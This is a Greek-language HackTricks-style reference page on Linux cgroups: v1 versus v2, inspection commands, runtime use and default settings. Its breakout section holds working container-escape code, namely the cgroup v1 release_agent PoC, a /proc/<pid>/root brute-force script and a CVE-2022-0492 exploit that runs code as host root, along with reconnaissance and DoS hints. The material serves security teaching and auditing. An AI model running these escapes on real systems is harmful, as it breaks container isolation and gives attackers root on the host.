# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Linux **control groups** είναι ο μηχανισμός του kernel που χρησιμοποιείται για την ομαδοποίηση processes με σκοπό την καταγραφή, τον περιορισμό, την ιεράρχηση και την επιβολή πολιτικών. Αν τα namespaces αφορούν κυρίως την απομόνωση της προβολής των resources, τα cgroups αφορούν κυρίως τη ρύθμιση του **πόσους** από αυτούς τους resources μπορεί να καταναλώνει ένα σύνολο processes και, σε ορισμένες περιπτώσεις, **με ποιες κατηγορίες resources** μπορούν να αλληλεπιδρούν. Τα containers βασίζονται συνεχώς στα cgroups, ακόμη και όταν ο χρήστης δεν τα εξετάζει άμεσα, επειδή σχεδόν κάθε σύγχρονο runtime χρειάζεται έναν τρόπο να ενημερώνει τον kernel ότι "αυτά τα processes ανήκουν σε αυτό το workload και αυτοί είναι οι resource rules που ισχύουν για αυτά".

Γι' αυτό οι container engines τοποθετούν ένα νέο container στο δικό του cgroup subtree. Μόλις το process tree βρεθεί εκεί, το runtime μπορεί να περιορίσει τη μνήμη, να περιορίσει τον αριθμό των PIDs, να καθορίσει το βάρος της χρήσης CPU, να ρυθμίσει το I/O και να περιορίσει την πρόσβαση σε devices. Σε ένα production περιβάλλον, αυτό είναι απαραίτητο τόσο για την ασφάλεια multi-tenant συστημάτων όσο και για την απλή operational hygiene. Ένα container χωρίς ουσιαστικούς resource controls μπορεί να εξαντλήσει τη μνήμη, να κατακλύσει το σύστημα με processes ή να μονοπωλήσει τη CPU και το I/O με τρόπους που καθιστούν τον host ή τα γειτονικά workloads ασταθή.

Από άποψη security, τα cgroups έχουν σημασία με δύο ξεχωριστούς τρόπους. Πρώτον, τα κακά ή ανύπαρκτα resource limits επιτρέπουν άμεσες denial-of-service επιθέσεις. Δεύτερον, ορισμένες δυνατότητες των cgroups, ειδικά σε παλαιότερες εγκαταστάσεις **cgroup v1**, έχουν δημιουργήσει ιστορικά ισχυρά breakout primitives όταν ήταν writable από το εσωτερικό ενός container.

## v1 Vs v2

Υπάρχουν δύο κύρια cgroup models σε χρήση. Το **cgroup v1** εκθέτει πολλαπλές controller hierarchies και παλαιότερα exploit writeups συχνά βασίζονται στα περίεργα και μερικές φορές υπερβολικά ισχυρά semantics που ήταν διαθέσιμα εκεί. Το **cgroup v2** εισάγει μια πιο ενοποιημένη hierarchy και γενικά πιο καθαρή συμπεριφορά. Οι σύγχρονες distributions προτιμούν ολοένα και περισσότερο το cgroup v2, όμως εξακολουθούν να υπάρχουν mixed ή legacy environments, πράγμα που σημαίνει ότι και τα δύο models παραμένουν σχετικά κατά την αξιολόγηση πραγματικών συστημάτων.

Η διαφορά έχει σημασία επειδή ορισμένες από τις πιο γνωστές ιστορίες container breakout, όπως οι καταχρήσεις του **`release_agent`** στο cgroup v1, συνδέονται πολύ συγκεκριμένα με παλαιότερη συμπεριφορά των cgroups. Ένας αναγνώστης που βλέπει ένα cgroup exploit σε ένα blog και στη συνέχεια το εφαρμόζει τυφλά σε ένα σύγχρονο σύστημα που χρησιμοποιεί μόνο cgroup v2 είναι πιθανό να παρανοήσει τι είναι πραγματικά εφικτό στον στόχο.

## Επιθεώρηση

Ο γρηγορότερος τρόπος για να δείτε πού βρίσκεται το τρέχον shell σας είναι ο εξής:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Το αρχείο `/proc/self/cgroup` εμφανίζει τα cgroup paths που σχετίζονται με την τρέχουσα διεργασία. Σε έναν σύγχρονο host με cgroup v2, συχνά θα δείτε μια unified καταχώριση. Σε παλαιότερους ή hybrid hosts, ενδέχεται να δείτε πολλαπλά controller paths του v1. Μόλις γνωρίζετε το path, μπορείτε να επιθεωρήσετε τα αντίστοιχα αρχεία κάτω από το `/sys/fs/cgroup` για να δείτε τα limits και την τρέχουσα χρήση.

Σε έναν host με cgroup v2, οι παρακάτω εντολές είναι χρήσιμες:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Αυτά τα αρχεία αποκαλύπτουν ποιοι controllers υπάρχουν και ποιοι έχουν εκχωρηθεί σε child cgroups. Αυτό το μοντέλο εκχώρησης έχει σημασία σε rootless και systemd-managed περιβάλλοντα, όπου το runtime μπορεί να έχει τη δυνατότητα να ελέγχει μόνο το υποσύνολο της λειτουργικότητας των cgroups που εκχωρεί πραγματικά η parent hierarchy.

## Εργαστήριο

Ένας τρόπος για να παρατηρήσετε τα cgroups στην πράξη είναι να εκτελέσετε ένα container με περιορισμό μνήμης:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Μπορείτε επίσης να δοκιμάσετε ένα container με περιορισμό PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Αυτά τα παραδείγματα είναι χρήσιμα, επειδή βοηθούν στη σύνδεση του runtime flag με το file interface του kernel. Το runtime δεν επιβάλλει τον κανόνα με κάποιο μαγικό τρόπο· γράφει τις σχετικές ρυθμίσεις του cgroup και στη συνέχεια αφήνει τον kernel να τις επιβάλει στο process tree.

## Χρήση Runtime

Τα Docker, Podman, containerd και CRI-O βασίζονται όλα στα cgroups ως μέρος της κανονικής λειτουργίας τους. Οι διαφορές συνήθως δεν αφορούν το αν χρησιμοποιούν cgroups, αλλά **ποια defaults επιλέγουν**, **πώς αλληλεπιδρούν με το systemd**, **πώς λειτουργεί το rootless delegation** και **πόσο μεγάλο μέρος του configuration ελέγχεται σε επίπεδο engine έναντι του orchestration level**.

Στο Kubernetes, τα resource requests και limits καταλήγουν τελικά να γίνονται cgroup configuration στον node. Η διαδρομή από το Pod YAML έως το kernel enforcement περνά από το kubelet, το CRI runtime και το OCI runtime, αλλά τα cgroups παραμένουν ο kernel μηχανισμός που εφαρμόζει τελικά τον κανόνα. Σε περιβάλλοντα Incus/LXC, τα cgroups χρησιμοποιούνται επίσης σε μεγάλο βαθμό, ειδικά επειδή τα system containers συχνά εκθέτουν πιο πλούσιο process tree και πιο VM-like operational expectations.

## Misconfigurations And Breakouts

Η κλασική ιστορία ασφάλειας των cgroups αφορά τον writable μηχανισμό **cgroup v1 `release_agent`**. Σε αυτό το μοντέλο, αν ένας attacker μπορούσε να γράψει στα σωστά cgroup files, να ενεργοποιήσει το `notify_on_release` και να ελέγξει το path που είναι αποθηκευμένο στο `release_agent`, ο kernel θα μπορούσε τελικά να εκτελέσει ένα path που επέλεξε ο attacker στα initial namespaces του host όταν το cgroup άδειαζε. Γι’ αυτό τα παλαιότερα writeups δίνουν τόση έμφαση στο cgroup controller writability, στα mount options και στις συνθήκες namespace/capability.

Ακόμη και όταν το `release_agent` δεν είναι διαθέσιμο, τα cgroup mistakes εξακολουθούν να έχουν σημασία. Η υπερβολικά ευρεία πρόσβαση σε devices μπορεί να καταστήσει host devices προσβάσιμα από το container. Η απουσία memory και PID limits μπορεί να μετατρέψει ένα απλό code execution σε host DoS. Το αδύναμο cgroup delegation σε rootless scenarios μπορεί επίσης να παραπλανήσει τους defenders, κάνοντάς τους να υποθέσουν ότι υπάρχει ένας περιορισμός, ενώ το runtime δεν μπόρεσε ποτέ στην πραγματικότητα να τον εφαρμόσει.

### `release_agent` Background

Η τεχνική `release_agent` εφαρμόζεται μόνο στο **cgroup v1**. Η βασική ιδέα είναι ότι όταν η τελευταία process σε ένα cgroup τερματιστεί και έχει οριστεί `notify_on_release=1`, ο kernel εκτελεί το πρόγραμμα του οποίου το path είναι αποθηκευμένο στο `release_agent`. Αυτή η εκτέλεση πραγματοποιείται στα **initial namespaces του host**, γεγονός που μετατρέπει ένα writable `release_agent` σε primitive για container escape.

Για να λειτουργήσει η τεχνική, ο attacker χρειάζεται γενικά:

- ένα writable **cgroup v1** hierarchy
- τη δυνατότητα να δημιουργήσει ή να χρησιμοποιήσει ένα child cgroup
- τη δυνατότητα να ορίσει το `notify_on_release`
- τη δυνατότητα να γράψει ένα path στο `release_agent`
- ένα path που resolves σε executable από την οπτική γωνία του host

### Classic PoC

Το ιστορικό one-liner PoC είναι:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Αυτό το PoC γράφει μια διαδρομή payload στο `release_agent`, ενεργοποιεί την απελευθέρωση του cgroup και, στη συνέχεια, διαβάζει το αρχείο εξόδου που δημιουργήθηκε στο host.

### Κατανοητή αναλυτική παρουσίαση

Η ίδια ιδέα γίνεται πιο εύκολη στην κατανόηση όταν αναλύεται σε βήματα.<sup>[[1]](#references)</sup>

1. Δημιουργία και προετοιμασία ενός εγγράψιμου cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Εντοπίστε τη διαδρομή του host που αντιστοιχεί στο filesystem του container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Αποθέστε ένα payload που θα είναι ορατό από τη διαδρομή του host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ενεργοποιήστε την εκτέλεση αδειάζοντας το cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Το αποτέλεσμα είναι η εκτέλεση του payload στην πλευρά του host με δικαιώματα root του host. Σε ένα πραγματικό exploit, το payload συνήθως γράφει ένα proof file, δημιουργεί ένα reverse shell ή τροποποιεί την κατάσταση του host.

### Παραλλαγή σχετικής διαδρομής με χρήση του `/proc/<pid>/root`

Σε ορισμένα περιβάλλοντα, η διαδρομή του host προς το filesystem του container δεν είναι προφανής ή αποκρύπτεται από τον storage driver. Σε αυτήν την περίπτωση, η διαδρομή του payload μπορεί να εκφραστεί μέσω του `/proc/<pid>/root/...`, όπου το `<pid>` είναι ένα host PID που ανήκει σε μια διεργασία στο τρέχον container. Αυτή είναι η βάση της παραλλαγής relative-path brute-force:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Το σχετικό trick εδώ δεν είναι το brute force, αλλά η μορφή του path: το `/proc/<pid>/root/...` επιτρέπει στον kernel να επιλύσει ένα αρχείο μέσα στο filesystem του container από το host namespace, ακόμη και όταν το άμεσο path αποθήκευσης στον host δεν είναι γνωστό εκ των προτέρων.

### Παραλλαγή CVE-2022-0492

Το 2022, το CVE-2022-0492 έδειξε ότι η εγγραφή στο `release_agent` στο cgroup v1 δεν έλεγχε σωστά το `CAP_SYS_ADMIN στο **initial** user namespace. Αυτό έκανε την τεχνική πολύ πιο προσβάσιμη σε ευάλωτους kernels, επειδή μια διεργασία container που μπορούσε να κάνει mount σε μια ιεραρχία cgroup μπορούσε να γράψει στο `release_agent` χωρίς να διαθέτει ήδη δικαιώματα στο host user namespace.<sup>[[3]](#references)</sup>

Ελάχιστο exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Σε έναν ευάλωτο kernel, το host εκτελεί το `/proc/self/exe` με δικαιώματα root του host.

Για πρακτική εκμετάλλευση, ξεκινήστε ελέγχοντας αν το περιβάλλον εξακολουθεί να εκθέτει εγγράψιμες διαδρομές `cgroup-v1` ή επικίνδυνη πρόσβαση σε συσκευές:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Αν το `release_agent` υπάρχει και είναι εγγράψιμο, βρίσκεστε ήδη σε σενάριο legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Αν το ίδιο το cgroup path δεν παρέχει escape, η επόμενη πρακτική χρήση είναι συχνά το denial of service ή το reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Αυτές οι εντολές δείχνουν γρήγορα αν το workload έχει περιθώριο να εκτελέσει fork-bomb, να καταναλώσει επιθετικά μνήμη ή να κάνει κατάχρηση ενός writable legacy cgroup interface.

## Έλεγχοι

Κατά την εξέταση ενός target, σκοπός των cgroup checks είναι να διαπιστωθεί ποιο cgroup model χρησιμοποιείται, αν το container βλέπει writable controller paths και αν παλιά breakout primitives, όπως το `release_agent`, είναι καν σχετικές.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν το `mount | grep cgroup` εμφανίζει **cgroup v1**, τα παλαιότερα breakout writeups γίνονται πιο σχετικά.
- Αν υπάρχει το `release_agent` και είναι προσβάσιμο, αυτό αξίζει αμέσως βαθύτερη διερεύνηση.
- Αν η ορατή ιεραρχία cgroup είναι εγγράψιμη και το container διαθέτει επίσης ισχυρά capabilities, το περιβάλλον χρειάζεται πολύ προσεκτικότερο έλεγχο.

Αν ανακαλύψετε **cgroup v1**, εγγράψιμα controller mounts και ένα container που διαθέτει επίσης ισχυρά capabilities ή αδύναμη προστασία seccomp/AppArmor, αυτός ο συνδυασμός απαιτεί ιδιαίτερη προσοχή. Τα cgroups συχνά αντιμετωπίζονται ως ένα αδιάφορο θέμα διαχείρισης πόρων, αλλά ιστορικά έχουν αποτελέσει μέρος ορισμένων από τις πιο διδακτικές αλυσίδες container escape, ακριβώς επειδή το όριο μεταξύ «ελέγχου πόρων» και «επιρροής στον host» δεν ήταν πάντα τόσο σαφές όσο υπέθεταν πολλοί.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Τα containers τοποθετούνται αυτόματα σε cgroups· τα resource limits είναι προαιρετικά, εκτός αν οριστούν με flags | παράλειψη των `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`· `--device`· `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | Το `--cgroups=enabled` είναι η προεπιλογή· τα προεπιλεγμένα cgroup namespaces διαφέρουν ανάλογα με την έκδοση cgroup (`private` στο cgroup v2, `host` σε ορισμένες εγκαταστάσεις cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, χαλαρότερη πρόσβαση σε devices, `--privileged` |
| Kubernetes | Ενεργοποιημένο μέσω του runtime από προεπιλογή | Τα Pods και τα containers τοποθετούνται σε cgroups από το node runtime· ο λεπτομερής έλεγχος πόρων εξαρτάται από τα `resources.requests` / `resources.limits` | παράλειψη resource requests/limits, privileged πρόσβαση σε devices, εσφαλμένη ρύθμιση runtime σε επίπεδο host |
| containerd / CRI-O | Ενεργοποιημένο από προεπιλογή | Τα cgroups αποτελούν μέρος της κανονικής διαχείρισης lifecycle | άμεσες ρυθμίσεις runtime που χαλαρώνουν τους ελέγχους devices ή εκθέτουν παλαιότερα εγγράψιμα interfaces cgroup v1 |

Η σημαντική διάκριση είναι ότι η **ύπαρξη cgroup** είναι συνήθως προεπιλεγμένη, ενώ οι **χρήσιμοι περιορισμοί πόρων** είναι συχνά προαιρετικοί, εκτός αν ρυθμιστούν ρητά.

## Αναφορές

- [1] [Κατανόηση των Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Νέα ευπάθεια Linux CVE-2022-0492 που επηρεάζει τα Cgroups: Μπορούν τα Containers να διαφύγουν;](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
